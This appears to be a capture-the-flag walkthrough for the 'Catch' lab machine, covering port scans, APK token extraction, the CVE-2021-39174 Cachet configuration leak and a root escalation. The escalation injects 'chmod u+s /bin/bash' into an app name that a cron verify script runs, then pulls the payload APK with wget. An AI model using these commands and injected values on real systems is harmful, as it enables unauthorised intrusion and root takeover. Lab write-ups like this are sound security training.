# scanning
* `TCP` Scan
TARGET=10.10.11.150 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap

```
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
3000/tcp open  ppp?    syn-ack ttl 63
8000/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.29 ((Ubuntu))
```
* one of the port is not found: `5000`, use the following to rescan
> for p in {1..65535}; do nc -vn 10.10.11.150 $p -w 1 -z & done 2> output.txt
> cat output.txt | grep " open"
```
(UNKNOWN) [10.10.11.150] 22 (ssh) open
(UNKNOWN) [10.10.11.150] 69 (?)(UNKNOWN) [10.10.11.150] 80 (http) open : Connection refused
(UNKNOWN) [10.10.11.150] 3000 (?) open
(UNKNOWN) [10.10.11.150] 5000 (?) open(UNKNOWN) [10.10.11.150] 4988 (?)
(UNKNOWN) [10.10.11.150] 8000 (?) open
```

# dirsearch
> dirsearch -u http://10.10.11.150 -f
> dirsearch -u http://10.10.11.150:3000 -f
> dirsearch -u http://10.10.11.150:5000 -f
> dirsearch -u http://10.10.11.150:8000 -f
> dirsearch -u http://status.catch.htb/ -f

# revese apk
* found a apk to download, reverse it
> apktool d apk
* found 3 tokens
* locate the site to use one of them `http://gitea.catch.htb:5000/login`

# intercept
* intercept http://gitea.catch.htb:5000/ and add header to request
Authorization: Bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==
* page doesn't render properly, use API to get the info needed
> http://gitea.catch.htb:5000/rooms/61b86b28d984e2451036eb17/messages/

# foothold
* read https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection
* CVE-2021-39174 - Configuration Leak works
* get cred for a user by exposing two parameters DB_USERNAME, DB_PASSWORD
* login as the user and get `user.txt`

# pe
* linpeas to enumerate
```
root      421623  0.0  0.0  18380  2928 ?        S    23:27   0:00      _ /bin/bash /root/check.sh
root      421662  0.0  0.0   6708   864 ?        S    23:27   0:00          _ inotifywait -q -e modify /var/www/html/Cachet/.env
root        1627  0.0  0.0 114100   164 ?        Sl   04:33   0:04 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 20efaaf440ecb50e233fc84d3862925ff262cefe0411e519a1697f07acc08625 -address /run/containerd/containerd.sock
root        1651  0.0  0.0  18380  2824 ?        Ss   04:33   0:00  _ /bin/bash -c while true;do /root/check.sh;done


tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:35047         0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -

[+] Readable files belonging to root and readable by me but not world readable
-rwxr-x--x+ 1 root root 1894 Mar  3 14:23 /opt/mdm/verify.sh
```
* pspy to monitor processes
```
2022/04/20 23:40:01 CMD: UID=0    PID=450128 | /usr/sbin/CRON -f 
2022/04/20 23:40:01 CMD: UID=0    PID=450131 | /bin/sh -c rm -rf /root/mdm/certified_apps/* 
2022/04/20 23:40:01 CMD: UID=0    PID=450130 | /bin/sh -c rm -rf /root/mdm/certified_apps/* 
2022/04/20 23:40:01 CMD: UID=0    PID=450133 | /bin/bash /opt/mdm/verify.sh 
2022/04/20 23:40:01 CMD: UID=0    PID=450132 | /bin/sh -c /opt/mdm/verify.sh 
2022/04/20 23:40:01 CMD: UID=0    PID=450137 | openssl rand -hex 12 
2022/04/20 23:40:01 CMD: UID=0    PID=450139 | jarsigner -verify /root/mdm/apk_bin/c4f0a83c469575aa2b51dc06.apk 
2022/04/20 23:40:01 CMD: UID=0    PID=450160 | /bin/bash /opt/mdm/verify.sh 
2022/04/20 23:40:01 CMD: UID=0    PID=450159 | /bin/bash /opt/mdm/verify.sh 
2022/04/20 23:40:01 CMD: UID=0    PID=450163 | rm -rf
```

* target on /opt/mdm/verify.sh at the following snippet

```bash
app_check() {
	APP_NAME=$(grep -oPm1 "(?<=<string name=\"app_name\">)[^<]+" "$1/res/values/strings.xml")
	...
}
```

* decompile catchv1.0.apk
* modify /res/values/strings.xml
```xml
<string name="app_name">Catch|chmod u+s /bin/bash</string>
```

* recompile the apk using a downloaded 2.5.0 version of jar
> java -jar /root/tools/Evil-Droid/tools/apktool.jar b catchv1.0

* create a cert and sign it
- Signed by "CN=Will Robinson, OU=DevTeam, O=Catch Global Systems, L=Athens, ST=Greece, C=30"
    Digest algorithm: SHA-256
    Signature algorithm: SHA256withRSA, 2048-bit key
> keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
> jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore my-release-key.keystore catchv1.0/dist/catchv1.0.apk alias_name

* upload to target and let it run
> wget http://<ip>/catchv1.0/dist/catchv1.0.apk -O /opt/mdm/apk_bin/catchv1.0.apk
* setup a nc listener and catch the shell

bash-5.0# cat root.txt
